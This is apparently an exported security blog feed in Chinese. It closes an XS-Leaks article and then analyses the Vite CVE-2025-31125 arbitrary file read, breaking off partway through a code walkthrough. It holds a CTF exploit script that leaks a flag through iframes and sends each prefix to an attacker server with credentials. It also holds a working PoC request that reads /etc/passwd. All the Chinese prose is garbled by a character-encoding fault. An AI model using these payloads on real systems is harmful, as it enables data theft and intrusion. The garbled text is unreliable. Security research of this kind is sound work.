class="line"> </span><br><span class="line"><span class="keyword">var</span> chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~ &#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> charLen = chars.<span class="property">length</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ENDPOINT</span> = <span class="string">&quot;http://challenges.fbctf.com:8082/search?query=&quot;</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">leak, charCounter</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> curChar = chars[charCounter];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Chek if the character is valid</span></span><br><span class="line">    x.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&#x27;http://challenges.fbctf.com:8082/search?query=&#x27;</span> + leak + curChar);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leak = &quot;</span> + leak + curChar);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//When the page inside the iframe is loaded</span></span><br><span class="line">    x.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥é¡µé¢ä¸­æœ‰å¤šå°‘ä¸ª iframeï¼Œå¦‚æœæœ‰1ä¸ªæˆ–å¤šä¸ªï¼Œåˆ™è¯´æ˜å½“å‰æšä¸¾çš„å­—ç¬¦æ˜¯æœ‰æ•ˆçš„ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> (x.<span class="property">contentWindow</span>.<span class="property">frames</span>.<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://myserver/leak?&#x27;</span> + <span class="built_in">escape</span>(leak), &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span></span><br><span class="line">            &#125;);</span><br><span class="line">            leak += curChar</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">search</span>(leak, (charCounter + <span class="number">1</span>) % chars.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">search</span>(<span class="string">&quot;fb&#123;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">exploit</span>();</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡æ£€æµ‹å¯¼èˆªæ³„éœ²"><a href="#é€šè¿‡æ£€æµ‹å¯¼èˆªæ³„éœ²" class="headerlink" title="é€šè¿‡æ£€æµ‹å¯¼èˆªæ³„éœ²"></a>é€šè¿‡æ£€æµ‹å¯¼èˆªæ³„éœ²</h2><p><a href="https://xsleaks.dev/docs/attacks/navigations/">https://xsleaks.dev/docs/attacks/navigations/</a></p><p>æ£€æµ‹è·¨ç«™é¡µé¢æ˜¯å¦è§¦å‘å¯¼èˆªå¯¹æ”»å‡»è€…æ¥è¯´å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œç½‘ç«™å¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·çš„çŠ¶æ€åœ¨æŸä¸ªç«¯ç‚¹è§¦å‘å¯¼èˆªã€‚</p><p>ä¸ºäº†æ£€æµ‹æ˜¯å¦å‘ç”Ÿäº†ä»»ä½•ç±»å‹çš„å¯¼èˆªï¼Œæ”»å‡»è€…å¯ä»¥ï¼š</p><ul><li>ä½¿ç”¨å¹¶è®¡ç®—äº‹ä»¶è¢«è§¦å‘çš„<code>iframe</code>æ¬¡æ•°ã€‚<code>onload</code></li><li>æ£€æŸ¥ çš„å€¼<code>history.length</code>ï¼Œè¯¥å€¼å¯é€šè¿‡ä»»ä½•çª—å£å¼•ç”¨è®¿é—®ã€‚è¿™æä¾›äº†å—å®³è€…å†å²è®°å½•ä¸­ç”±<code>history.pushState</code>æˆ–å¸¸è§„å¯¼èˆªæ›´æ”¹çš„æ¡ç›®æ•°ã€‚ä¸ºäº†è·å– çš„å€¼<code>history.length</code>ï¼Œæ”»å‡»è€…å°†çª—å£å¼•ç”¨çš„ä½ç½®æ›´æ”¹ä¸ºç›®æ ‡ç½‘ç«™ï¼Œç„¶åæ”¹å›åŒæºï¼Œæœ€åè¯»å–è¯¥å€¼ã€‚</li></ul><h2 id="é€šè¿‡æµè§ˆå™¨ç¼“å­˜æ³„éœ²"><a href="#é€šè¿‡æµè§ˆå™¨ç¼“å­˜æ³„éœ²" class="headerlink" title="é€šè¿‡æµè§ˆå™¨ç¼“å­˜æ³„éœ²"></a>é€šè¿‡æµè§ˆå™¨ç¼“å­˜æ³„éœ²</h2><p>å½“ç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ï¼Œè¿™äº›ç½‘ç«™çš„èµ„æºé€šå¸¸ä¼šè¢«ç¼“å­˜å¹¶å­˜å‚¨åœ¨ç”¨æˆ·çš„ç£ç›˜ä¸Šï¼Œå› æ­¤ä¸å¿…å†æ¬¡ä¸‹è½½ã€‚è¿™èŠ‚çœäº†å¸¦å®½ï¼Œé™ä½äº†æœåŠ¡å™¨è´Ÿè½½ï¼Œå¹¶æ”¹å–„äº†ç”¨æˆ·ä½“éªŒã€‚</p><p>ä¸å¹¸çš„æ˜¯ï¼ŒåŸºäºæ—¶é—´å’Œé”™è¯¯çš„ xsleak å˜ä½“å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å¹¶ç¡®å®šç”¨æˆ·ä¹‹å‰æ˜¯å¦è®¿é—®è¿‡ç½‘ç«™ã€‚</p><p>ç¼“å­˜æ—¶é—´å˜åŒ–å¾ˆç®€å•ï¼Œä¸ºè¯·æ±‚è®¡æ—¶ï¼Œå¦‚æœæ˜¯ç¬æ—¶çš„ï¼Œåˆ™èµ„æºè¢«ç¼“å­˜ã€‚</p><p>åŸºäºé”™è¯¯çš„ç‰ˆæœ¬ç¨å¾®å¤æ‚ä¸€äº›ã€‚å®ƒåˆ©ç”¨äº†ç¼“å­˜èµ„æºä»æœªä»æœåŠ¡å™¨å®é™…è¯·æ±‚è¿‡çš„äº‹å®ã€‚å› æ­¤ï¼Œå¯¹ç¼“å­˜èµ„æºçš„æ— æ•ˆ HTTP è¯·æ±‚ä¸ä¼šå¼•å‘å¼‚å¸¸ï¼ˆå› ä¸º Web æœåŠ¡å™¨æ°¸è¿œæ²¡æœ‰æœºä¼šæ‹’ç»å®ƒï¼‰ã€‚</p><h2 id="é€šè¿‡å¸§ä¸­çš„-ID-å­—æ®µæ³„æ¼"><a href="#é€šè¿‡å¸§ä¸­çš„-ID-å­—æ®µæ³„æ¼" class="headerlink" title="é€šè¿‡å¸§ä¸­çš„ ID å­—æ®µæ³„æ¼"></a>é€šè¿‡å¸§ä¸­çš„ ID å­—æ®µæ³„æ¼</h2><p><a href="https://xsleaks.dev/docs/attacks/id-attribute/">https://xsleaks.dev/docs/attacks/id-attribute/</a></p><h1 id="é˜²æ­¢XS-Leaks"><a href="#é˜²æ­¢XS-Leaks" class="headerlink" title="é˜²æ­¢XS-Leaks"></a>é˜²æ­¢XS-Leaks</h1><p>å®Œå…¨é˜²æ­¢æ˜¯ä¸å¯èƒ½æ»´</p><ol><li>ä½¿ç”¨ SameSite å±æ€§ä¿æŠ¤æ‚¨çš„ cookieã€‚</li><li>ä½¿ç”¨ Content-Security-Policy å’Œ X-Frame-Options æ¥é˜²æ­¢æ¡†æ¶ã€‚</li><li>è€ƒè™‘ä½¿ç”¨ Cache-Control ç¦ç”¨ç¼“å­˜ã€‚</li><li>ä½¿ç”¨ fetch metadata headers å’Œ Vary header æ¥é˜²æ­¢ç¼“å­˜æ¢æµ‹ã€‚</li><li>å®æ–½è·¨åŸŸå¼€æ”¾æ”¿ç­–ã€‚</li><li>å®æ–½è·¨åŸŸèµ„æºç­–ç•¥ã€‚</li><li>å®æ–½éš”ç¦»æ”¿ç­–ã€‚</li></ol><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/allway2/article/details/126703565">https://blog.csdn.net/allway2/article/details/126703565</a></p><p><a href="https://www.cnblogs.com/starrys/p/15171221.html">https://www.cnblogs.com/starrys/p/15171221.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¾§ä¿¡é“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°(CVE-2025-31125)</title>
      <link href="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/"/>
      <url>/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>Affected versions</strong></p><ul><li>6.2.0 &lt;&#x3D; Vite &lt;&#x3D; 6.2.3</li><li>6.1.0 &lt;&#x3D; Vite &lt;&#x3D; 6.1.2</li><li>6.0.0 &lt;&#x3D; Vite &lt;&#x3D; 6.0.12</li><li>5.0.0 &lt;&#x3D; Vite &lt;&#x3D; 5.4.15</li><li>Vite &lt;&#x3D; 4.5.10</li></ul></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªæ¼æ´å…¶å®æ˜¯CVE-2025-30208çš„å‡çº§ç‰ˆ</p><p>è¿™é‡Œç›´æ¥å…ˆç»™å‡ºå…¬å¼€çš„POCï¼š<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><p>æˆ‘ä»¬çœ‹çœ‹6.2.2ï¼Œ6.2.3ï¼Œ6.2.4ï¼Œ6.2.5ç‰ˆæœ¬çš„packages&#x2F;vite&#x2F;src&#x2F;node&#x2F;server&#x2F;middlewares&#x2F;transform.tsæ–‡ä»¶çš„commitå…ˆå§ã€‚</p><p>å…ˆçœ‹çœ‹ä¿®è¡¥6.2.2çš„commitï¼šæ­¤å¤„æ˜¯ä¿®è¡¥äº†CVE-2025-30208ï¼Œä½†æ˜¯CVE-2025-31125ä»ç„¶æ˜¯å­˜åœ¨çš„ã€‚</p><p><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188</a></p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403220258037.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æ­¤å¤„çš„ä¿®è¡¥å…¶å®ä¸»è¦åœ¨äºå»é™¤æœ«å°¾å¤šçš„<code>?</code>å’Œ<code>&amp;</code>ã€‚</p><p>ç„¶åæˆ‘ä»¬å†çœ‹çœ‹ä¿®è¡¥6.2.3çš„commit</p><p><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403222124870.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æ­¤å¤„çš„ä¿®è¡¥ä¸»è¦æ˜¯å¯¹äºinlineREçš„ä¿®è¡¥ã€‚ä¹Ÿå°±æ˜¯å¯¹ä¸Šé¢é‚£ä¸ªå…¬å¼€POCçš„ä¿®è¡¥ï¼ä½†æ˜¯æœªå…¬å¼€çš„POCè¿˜æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼ï¼ï¼ï¼</p><p>å†çœ‹çœ‹ä¿®è¡¥6.2.4çš„commitï¼ˆä¸‹é¢åˆ†æçš„æ—¶å€™å†è¯´ï¼‰ï¼Œä¿®è¡¥äº†æœªå…¬å¼€çš„POCã€‚ã€‚ã€‚</p><p><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7c">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7c</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="å…¬å¼€POC"><a href="#å…¬å¼€POC" class="headerlink" title="å…¬å¼€POC"></a>å…¬å¼€POC</h3><p><code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><p>çœ‹çœ‹vite6.2.4</p><p>å…ˆçœ‹çœ‹æœ€æœ«å°¾çš„æ–‡ä»¶è¯»å–å¤„ï¼š</p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403230132287.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æŸ¥çœ‹å‡½æ•°è°ƒç”¨</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">pluginContext</span>: <span class="title class_">PluginContext</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; environment &#125; = pluginContext</span><br><span class="line">  <span class="keyword">if</span> (environment.<span class="property">config</span>.<span class="property">command</span> === <span class="string">&#x27;serve&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fileToDevUrl</span>(environment, id)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fileToBuiltUrl</span>(pluginContext, id)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­æŸ¥çœ‹å‡½æ•°è°ƒç”¨ï¼Œå…¨å±€æœå‘ç°loadå‡½æ•°ï¼Œå…¶å®è¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡6.2.5çš„commitæ¥å‘ç°6.2.4åˆ é™¤äº†<code>!id.endsWith(&#39;.wasm?init&#39;)</code>ï¼Œæ¢æˆäº†<code>!wasmInitRE.test(id)</code>ã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id === wasmHelperId) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;wasmHelperCode&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!id.<span class="title function_">endsWith</span>(<span class="string">&#x27;.wasm?init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">import initWasm from &quot;<span class="subst">$&#123;wasmHelperId&#125;</span>&quot;</span></span><br><span class="line"><span class="string">export default opts =&gt; initWasm(opts, <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(url)&#125;</span>)</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å…¶å®æ˜¯æ»¡è¶³idçš„æœ«å°¾æ˜¯<code>.wasm?init</code>çš„è¯ï¼Œå°±è¿›å…¥fileToUrlã€‚ä¹Ÿå°±æ˜¯ç»“å°¾éœ€è¦æ»¡è¶³.wasm?initã€‚</p><p>è¿›å…¥fileToUrlåä¼šé»˜è®¤è¿›å…¥fileToDevUrlï¼Œå°±æ˜¯åœ¨è¿™é‡Œè¯»å–äº†fileã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToDevUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  skipBase = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> config = environment.<span class="title function_">getTopLevelConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> publicFile = <span class="title function_">checkPublicFile</span>(id, config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If has inline query, unconditionally inline the asset</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If is svg and it&#x27;s inlined in build, also inline it in dev to match</span></span><br><span class="line">  <span class="comment">// the behaviour in build due to quote handling differences.</span></span><br><span class="line">  <span class="keyword">if</span> (svgExtRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldInline</span>(environment, file, id, content, <span class="literal">undefined</span>, <span class="literal">undefined</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">rtn</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="keyword">if</span> (publicFile) &#123;</span><br><span class="line">    <span class="comment">// in public dir during dev, keep the url as-is</span></span><br><span class="line">    rtn = id</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id.<span class="title function_">startsWith</span>(<span class="title function_">withTrailingSlash</span>(config.<span class="property">root</span>))) &#123;</span><br><span class="line">    <span class="comment">// in project root, infer short public path</span></span><br><span class="line">    rtn = <span class="string">&#x27;/&#x27;</span> + path.<span class="property">posix</span>.<span class="title function_">relative</span>(config.<span class="property">root</span>, id)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// outside of project root, use absolute fs path</span></span><br><span class="line">    <span class="comment">// (this is special handled by the serve static middleware</span></span><br><span class="line">    rtn = path.<span class="property">posix</span>.<span class="title function_">join</span>(<span class="variable constant_">FS_PREFIX</span>, id)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skipBase) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtn</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> base = <span class="title function_">joinUrlSegments</span>(config.<span class="property">server</span>.<span class="property">origin</span> ?? <span class="string">&#x27;&#x27;</span>, config.<span class="property">decodedBase</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">joinUrlSegments</span>(base, <span class="title function_">removeLeadingSlash</span>(rtn))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹idè¿›è¡ŒcleanUrlï¼Œä¹Ÿå°±æ˜¯ä¸€æ¬¡æ¸…æ´—ï¼ˆ<strong>åŒ¹é…ä» <code>?</code> æˆ– <code>#</code> å¼€å§‹ç›´åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å­—ç¬¦</strong>ï¼‰ï¼Œå¦‚&#x2F;etc&#x2F;passwd?&amp;raw??ä¼šè¢«æ›¿æ¢ä¸º&#x2F;etc&#x2F;passwdã€‚cleanUrlåè¯»å–æ–‡ä»¶ï¼</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postfixRE = <span class="regexp">/[?#].*$/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cleanUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(postfixRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨pocèµ°ä¸€éä»£ç ï¼ˆvite6.2.4ï¼‰ã€‚<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403232929286.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è¿™é‡Œç»è¿‡äº†removeTimestampQueryå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€åä¸æ˜¯é—®å·æ‰€ä»¥æ²¡äº‹</p><p>æ¥ä¸‹æ¥æ˜¯ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlWithoutTrailingQuerySeparators = url.<span class="title function_">replace</span>(</span><br><span class="line">  trailingQuerySeparatorsRE,</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>urlè¿˜æ˜¯<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><p>ç„¶åæˆ‘ä»¬è¦è¿›å…¥ä¸€ä¸ªifè¯­å¥ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> inlineRE = <span class="regexp">/[?&amp;]inline\b/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          inlineRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      ) </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦è®©å‰ä¸‰ä¸ªtestéƒ½ä¸ºfalseæ‰è¡Œï¼</p><p>ä½†æ˜¯æ­¤å¤„inlineRE.testä¼šåŒ¹é…åˆ°ï¼å› æ­¤vite6.2.4 ä¿®è¡¥äº†è¿™ä¸ªæ¼æ´ï¼ˆCVE-2025-31125ï¼‰ï¼</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è·Ÿä¸€évite6.2.3ï¼š</p><p>æˆ‘ä»¬ä»ifè¯­å¥å¤„å¼€å§‹åˆ†æï¼Œæ­¤æ—¶urlä¸º<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±åŒ¹é…ä¸åˆ°äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€ä¸‹èµ°äº†ã€‚</p><p>è¿›å…¥ä¸‹ä¸€ä¸ªifè¯­å¥ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 